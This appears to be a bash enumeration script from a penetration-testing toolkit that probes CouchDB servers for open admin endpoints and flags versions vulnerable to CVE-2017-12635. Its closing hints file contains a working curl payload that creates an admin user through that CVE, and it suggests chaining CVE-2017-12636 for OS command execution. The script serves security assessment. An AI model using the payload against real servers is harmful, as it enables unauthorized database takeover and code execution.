#!/usr/bin/env bash
# enum-couchdb.sh — CouchDB enumeration.
#
# Notable CVEs:
#   CVE-2017-12635 — JSON parser type confusion -> admin user creation
#   CVE-2017-12636 — RCE via _config edit (chained with the above)
#   CVE-2022-24706 — Apache CouchDB unauth admin (Erlang cookie default)
#
# READ-ONLY: probes _all_dbs, _users, _config — never PUTs.

set -uo pipefail
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
. "$SCRIPT_DIR/_lib.sh"
parse_common_args "$@" || exit 1
log "couchdb: $(wc -l < "$TARGETS") targets -> $OUT"

if ! have curl; then
    miss "curl not installed — couchdb dispatcher cannot probe"
    exit 0
fi

while read -r target; do
    [ -z "$target" ] && continue
    read -r ip port <<< "$(split_ipport "$target")"
    h="$ip"; [[ "$ip" == *:* ]] && h="[$ip]"
    out_dir="$OUT/${ip}_${port}"; mkdir -p "$out_dir"
    scheme="http"; [ "$port" = "6984" ] && scheme="https"
    base="${scheme}://${h}:${port}"

    AUTH=()
    [ -n "${ENUM_USER:-}" ] && [ -n "${ENUM_PASS:-}" ] && AUTH=(-u "${ENUM_USER}:${ENUM_PASS}")

    # ---------- version + welcome ----------
    code=$(curl -ksI "${AUTH[@]}" --connect-timeout 5 --max-time 10 \
                -o /dev/null -w '%{http_code}' "$base/" 2>/dev/null)
    [ "$code" = "000" ] && continue
    curl -ks "${AUTH[@]}" --connect-timeout 5 --max-time 10 "$base/" \
        > "$out_dir/welcome.json" 2>/dev/null || true
    if grep -q '"couchdb":"Welcome"' "$out_dir/welcome.json" 2>/dev/null; then
        ver=$(grep -oE '"version":"[^"]+' "$out_dir/welcome.json" | head -1 | cut -d'"' -f4)
        log "  $base CouchDB version $ver"
    fi

    # ---------- _all_dbs / _users / _config (admin-only normally) ----------
    for ep in _all_dbs _users/_all_docs _config _membership _node/_local/_config; do
        safe=$(echo "$ep" | sed 's|/|_|g')
        code=$(curl -ksI "${AUTH[@]}" --connect-timeout 5 --max-time 10 \
                    -o /dev/null -w '%{http_code}' "$base/$ep" 2>/dev/null)
        if [ "$code" = "200" ]; then
            curl -ks "${AUTH[@]}" --connect-timeout 5 --max-time 15 \
                "$base/$ep" > "$out_dir/${safe}.json" 2>/dev/null || true
            if [ -z "${ENUM_USER:-}" ]; then
                hit "UNAUTH $base/$ep returned 200 (admin party mode = pre-1.x or CVE-2017-12635 admin-create succeeded)"
            fi
        fi
    done

    # ---------- CVE-2017-12635 detection (NOT exploitation) ----------
    # The CVE is exploited by POSTing two "roles" fields in the same JSON
    # body to /_users/org.couchdb.user:<name>. Detect-only: check if
    # _users db is reachable AND version is < 1.7.0 / < 2.1.1.
    if [ -s "$out_dir/welcome.json" ]; then
        ver=$(grep -oE '"version":"[^"]+' "$out_dir/welcome.json" | head -1 | cut -d'"' -f4)
        case "$ver" in
            1.[0-6].*|2.0.*|2.1.0)
                warn=$(printf "POTENTIALLY VULNERABLE to CVE-2017-12635 (version %s precedes the patch in 1.7.0 / 2.1.1)" "$ver")
                err "$warn — host $base"
                echo "$warn" > "$out_dir/_cve-2017-12635_signal.txt" ;;
        esac
    fi
done < "$TARGETS"

cat > "$OUT/_hints.txt" <<'EOF'
CouchDB follow-ups:
  * CVE-2017-12635 admin-create PoC (DO NOT run without authorization):
      curl -X PUT http://<ip>:5984/_users/org.couchdb.user:hax \
        -H 'Content-Type: application/json' \
        -d '{"type":"user","name":"hax","roles":["_admin"],"roles":[],"password":"x"}'
    Then chain CVE-2017-12636 to write a config that runs an OS command.
  * "Admin party" mode (CouchDB 1.x with no admin set) -> /_config accepts
    anonymous writes; this is the historical default that still ships in
    some Docker images.
  * Modern CouchDB 3.x without an Erlang-cookie change -> CVE-2022-24706
    (admin via internal port 4369 epmd).
EOF

log "couchdb dispatcher done."
